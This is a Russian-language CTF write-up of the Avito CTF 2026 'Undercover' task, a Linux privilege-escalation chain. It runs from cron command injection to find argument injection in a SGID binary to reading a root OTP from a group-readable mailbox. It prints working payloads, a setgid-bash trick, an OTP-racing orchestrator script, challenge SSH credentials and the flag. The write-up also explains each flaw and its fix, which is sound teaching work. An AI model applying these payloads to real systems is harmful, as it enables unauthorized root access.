# Undercover — райтап

**Флаг:** `avito{the_OP3ra7I0n_wAS_suCce5sfuL}`
**Класс:** Linux / privilege escalation (цепочка cron → SGID → OTP-по-почте) · **Сложность:** не зафиксирована в архиве · **Очки:** не зафиксированы · **Решило команд:** не зафиксировано
**Автор:** оргкоманда Avito CTF 2026 · SPbCTF (конкретный ник в архиве не зафиксирован)

**Суть решения в одном абзаце.** Три отдельные небрежности, безобидные по-одиночке, выстраиваются в путь до root: (1) cron от имени `backupuser` склеивает содержимое writable-файла в `sh -c "…$INPUT…"` без кавычек → command injection; (2) SGID-mail бинарь `delete_old_mail` зовёт `system("find … -mtime +<ARG> …")` с дырявым блеклистом → argument injection, дающий нам `egid=mail`; (3) одноразовый OTP для входа под root кладётся письмом в `/var/mail/root` с правами `660 mail:mail`, читаемыми всей группой `mail`. Пройдя звенья по цепочке в одной SSH-сессии, читаем OTP из mailbox, скармливаем его `su root` и получаем `/root/flag.txt`.

---

## 1. Задача

Мы — оперативник-медоед, уже захвативший учётку самой бесправной «рабочей пчелы» `worker`. Нужно **тихо и быстро** дорасти до `root` и прочитать `/root/flag.txt`.

```
ssh worker@undercover-zhvo8wkj.avitoctf.ru
пароль: ufqIDMVBm5MHPHg8dcVTcQ
```

Итоговая цепочка привилегий, которую мы собрали:

```
worker  ──(cron + инъекция команд)──►  backupuser
        ──(SGID-mail + инъекция аргументов в find)──►  egid=mail
        ──(OTP в mailbox root, читаемом группой mail)──►  root
```

## 2. Разведка

Методология privesc = **энумерация → найти неаккуратно настроенную вещь, работающую с более высокими правами**. Прогнали стандартный чек-лист (см. также `task.md`):

- `id` — `uid=1000(worker)`, обычный юзер.
- `sudo -n -l` — sudo требует пароль → мимо.
- `find / -perm -4000` и `find / -perm -2000` — **SUID/SGID** бинарники (запускаются с правами владельца/группы файла).
- `getcap -r /` — capabilities.
- `/etc/cron.d/*`, `/etc/crontab`, таймеры — **что root и другие юзеры запускают по расписанию**, и не писабельны ли их входные данные.
- версия ОС/ядра, запущенные сервисы.

Что нашлось и почему это заинтересовало:

- **Debian 12 в Docker**. Критично: **каждое SSH-подключение = свежий эфемерный контейнер**. Значит все звенья цепочки надо проходить в ОДНОЙ сессии (мы держали persistent-канал через `session_server.py`), иначе изменения теряются между командами.
- `/etc/cron.d/backup` — раз в минуту что-то запускается от **`backupuser`** (чужие права по расписанию → первый кандидат).
- SGID-бинарь **`delete_old_mail`** с группой **`mail`** (`-rwxr-sr-- backupuser mail`) — «утилита» с повышенной группой.
- SUID `exim4`, PAM-модуль `pam_otp_root.py` в `/etc/pam.d/su` — почта и нестандартная аутентификация root.

## 3. Как мы вышли на решение (логика гипотез)

**Наблюдение → гипотеза (сшивка звеньев).** Четыре находки из разведки складываются в один сюжет ещё до эксплуатации: есть почта (`exim4`), есть OTP для входа под root, который куда-то доставляется, есть бинарь, дающий повышенную группу `mail`, и есть cron под чужим юзером. **Гипотеза:** ключ к root — это одноразовый OTP, который PAM-модуль кладёт в почтовый ящик root; если получить `gid=mail`, ящик станет читаемым. Осталось найти два «моста»: как получить `egid=mail` и как до него — права `backupuser`.

**Проверка звеньев по очереди** (каждое подтверждалось на живой цели):

- **Звено к `backupuser`.** `/etc/cron.d/backup` раз в минуту от `backupuser` собирает `sh -c "rsync … $INPUT /backup/"`, где `$INPUT` = содержимое `/backup/listing`. Права файла — `0777`, писать может `worker`. Значит содержимое writable-файла попадает в строку шелла без кавычек → **command injection** как `backupuser`.
- **Звено к `egid=mail`.** SGID-mail бинарь `delete_old_mail` внутри зовёт `system("find /var/mail/ -type f -mtime +<ARG> -print -delete")`. Есть блеклист `has_forbidden_chars` (`; ' " \` \ $ ( ) | & < >`), но он **не запрещает пробел, `+` и `{}`** → в `find` можно дописать `-o -type d -exec … {} +`, то есть **argument injection** с исполнением нашего скрипта под `egid=mail`.
- **Тонкость доступа (мини-тупик, решённый обходом).** Каталог `/backup/deactivated` = `drwx---r-x root backupuser`: у `backupuser` group-биты `---` → внутрь он **войти не может**, а `worker` (other `r-x`) может, но сам бинарь исполним только владельцем-`backupuser`. Вывод: `worker` **выносит бинарь наружу** (`mv … /tmp/.dom` в пределах одного overlayfs сохраняет SGID-бит), а **запускает его `backupuser`** через звено 1.
- **Звено к root.** `/etc/pam.d/su` содержит `pam_python.so /usr/local/bin/pam_otp_root.py` (`requisite`) и `pam_succeed_if.so … user = root` (`[success=done default=ignore]`). Модуль генерит 9-значный OTP, шлёт его письмом root (`/var/mail/root`, режим `660 mail:mail`) и спрашивает код. **Ключевое наблюдение:** ящик читается группой `mail`, а мы на звене 2 получили `egid=mail`. Значит можно параллельно `su root` вытащить OTP из mailbox и скормить его — `pam_succeed_if user=root` даст `success=done` → root без пароля root.

**Эфемерность как отдельная сложность.** Так как контейнер пересоздаётся на каждое подключение, все шаги нужно исполнять в одной живой сессии. Отсюда `session_server.py` — постоянный SSH shell-канал, удерживающий один контейнер и гоняющий по нему команды из файловой очереди.

## 4. Уязвимость

Три бага, каждый — классическая ошибка:

1. **Инъекция команд**: содержимое writable-файла подставляется в строку `sh -c "…$INPUT…"` без кавычек.
2. **Инъекция аргументов**: SGID-бинарь зовёт `system("find … -mtime +<ARG> …")`, а блеклист символов **неполон** (пропускает пробел, `+`, `{}`), что позволяет дописать `-exec`.
3. **Секрет в групп-читаемом ресурсе**: одноразовый OTP для входа под root кладётся в `/var/mail/root` с правами `660 mail:mail` → читается **всей группой `mail`**.

## 5. Эксплойт по шагам

### Звено 1: command injection (worker → backupuser)

`/etc/cron.d/backup` раз в минуту от имени `backupuser` делает по сути:

```sh
INPUT=$(cat "$1")                                        # $1 = /backup/listing
/bin/sh -c "rsync --archive --verbose $INPUT /backup/"   # $INPUT НЕ в кавычках!
```

Файл `/backup/listing` имеет права `0777` — писать может кто угодно, включая worker. Пишем в файл `;<команда>;#`, и в ближайшую минуту `<команда>` выполнится уже как `backupuser`.

*Почему баг:* недоверенный ввод (содержимое writable-файла) попадает в строку шелл-команды. Правильно — не звать `sh -c` со склейкой, а передавать аргументы массивом.

### Звено 2: SGID-mail + argument injection (backupuser → egid=mail)

`/backup/deactivated/utils/delete_old_mail` — `-rwxr-sr-- backupuser mail` (**SGID-mail**: при запуске получает `egid=mail`). Внутри:

```c
setregid(mail, mail);
system("find /var/mail/ -type f -mtime +<ARG> -print -delete");   // <ARG> из аргумента
```

Блеклист не запрещает пробелы, `+` и `{}` → дописываем аргументы в `find`. Полезная нагрузка (файл `payload.txt` / поле аргумента):

```
1 -o -type d -exec /tmp/.m.sh {} + -o -type f
```

`find -exec /tmp/.m.sh {} +` запустит наш скрипт `/tmp/.m.sh` уже с `egid=mail`. Этим скриптом (`m.sh`) делаем **постоянный SGID-mail bash**:

```sh
cp /bin/bash /tmp/.mbash && chmod 2755 /tmp/.mbash   # 2755 = setgid, group=mail
```

Обход прав каталога `/backup/deactivated` (см. §3): worker выносит бинарь наружу (`mv /backup/deactivated/utils/delete_old_mail /tmp/.dom`), а запускает его backupuser. Итоговая полезная нагрузка в `/backup/listing` (см. `payload.txt`):

```
;/tmp/.dom "1 -o -type d -exec /tmp/.m.sh {} + -o -type f";#
```

По cron это выполняется как `backupuser` → `/tmp/.dom` (наш `delete_old_mail`) под `egid=mail` через `find -exec` создаёт `/tmp/.mbash` — bash с SGID-mail.

### Звено 3: OTP-по-почте (egid=mail → root)

`/etc/pam.d/su`:

```
auth requisite pam_python.so /usr/local/bin/pam_otp_root.py
auth [success=done default=ignore] pam_succeed_if.so quiet user = root
```

Модуль `pam_otp_root.py` генерит 9-значный OTP и **отправляет его письмом root** (`mail -s "OTP for root login" root` → exim → `/var/mail/root`, режим `660 mail:mail`), затем спрашивает код у пользователя. Верный OTP проходит `requisite`, а `pam_succeed_if user=root` даёт `success=done` → **root без пароля root**.

Оркестратор `orch.sh` (запускается нашим `/tmp/.mbash -p`, т.е. с `egid=mail`) делает это гонкой:

```sh
rm -f /var/mail/root ...                      # убрать старое письмо, чтобы не поймать чужой OTP
mkfifo /tmp/sin; exec 3<>/tmp/sin             # канал для подачи OTP в su
# su в псевдотерминале (script), сразу читает флаг после логина:
script -q -f -c 'su root -c "id; echo FLAGSTART; cat /root/flag.txt; echo FLAGEND; \
     cat /root/flag.txt >/tmp/flag_out"' /tmp/su.log < /tmp/sin &
# поллим mailbox root, пока не появится строка ровно из 9 цифр:
for i in $(seq 1 200); do
  OTP=$(tr -d '\r' < /var/mail/root | awk '/^[0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]$/{print; exit}')
  [ -n "$OTP" ] && break
  sleep 0.25
done
printf '%s\n' "$OTP" >&3                        # отдаём OTP в su через fifo
```

`su` принимает OTP → `pam_succeed_if user=root` → **root** → `cat /root/flag.txt` пишет флаг в `/tmp/flag_out`.

*Почему баг:* секрет второго фактора (OTP) не должен быть доступен никому, кроме проверяющего. Здесь он лежит в mailbox, читаемом целой группой `mail`, в которую мы смогли попасть.

### Полный прогон (всё в одной сессии)

Поскольку контейнер эфемерный, шаги выполняются в одном persistent-канале (`session_server.py`):

1. `mv /backup/deactivated/utils/delete_old_mail /tmp/.dom` — вынести SGID-mail бинарь наружу (worker может).
2. Записать `/tmp/.m.sh` (см. `m.sh`): `cp /bin/bash /tmp/.mbash; chmod 2755 /tmp/.mbash`.
3. В `/backup/listing` записать полезную нагрузку (см. `payload.txt`) и ждать cron (до минуты):
   `;/tmp/.dom "1 -o -type d -exec /tmp/.m.sh {} + -o -type f";#`
   → cron(backupuser) → `find -exec` создаёт `/tmp/.mbash` c SGID-mail.
4. Запустить `/tmp/.mbash -p orch.sh` (сессия с `egid=mail`): гонка `su root` ↔ чтение OTP из `/var/mail/root` → root → флаг.

## 6. Флаг

```
avito{the_OP3ra7I0n_wAS_suCce5sfuL}
```

Прочитан из `/root/flag.txt` от имени `uid=0(root)` (совпадает с `FLAG.txt` в папке).

## 7. Выводы

- **Три мелочи → root.** По отдельности writable-файл, SGID-утилита и OTP-в-почте выглядят безобидно; privesc — это искусство сшивать их в цепочку.
- **Экранируй ввод.** Не `sh -c "…$X…"`, а массив аргументов. И блеклист символов — плохая защита от инъекции аргументов: `find` управляется через `-o`, `-exec`, `{}`, `+`, которые не «спецсимволы».
- **SGID/SUID + `system()` = красный флаг.** Утилита с повышенной группой не должна вызывать шелл со строкой, собранной из ввода.
- **Секреты — только проверяющему.** OTP в групп-читаемом файле = OTP скомпрометирован для всей группы.
- **Эфемерное окружение.** Docker-контейнер на каждое подключение → эксплойт нужно собирать в одной сессии (persistent-канал), иначе артефакты между командами теряются.

## 8. Артефакты

- `session_server.py` — curated-скрипт: постоянный SSH shell-канал, удерживающий ОДИН эфемерный контейнер, и файловая очередь команд (`NNN.cmd → NNN.out → NNN.done`). Именно он позволяет пройти всю цепочку в одной сессии (ruff+ty чисто, Google-docstring; `paramiko` без стабов → точечный `# ty: ignore`).
- `m.sh` — скрипт, который `find -exec` запускает под `egid=mail`, создающий SGID-mail bash `/tmp/.mbash`.
- `payload.txt` — полезная нагрузка в `/backup/listing` (command injection → argument injection).
- `orch.sh` — оркестратор третьего звена: гонка `su root` ↔ чтение OTP из `/var/mail/root`.
- `sh.py` / `run.py` / `shell.py` — вспомогательные одноразовые SSH-обёртки (одна команда за подключение).
- `FLAG.txt` — сохранённый флаг.
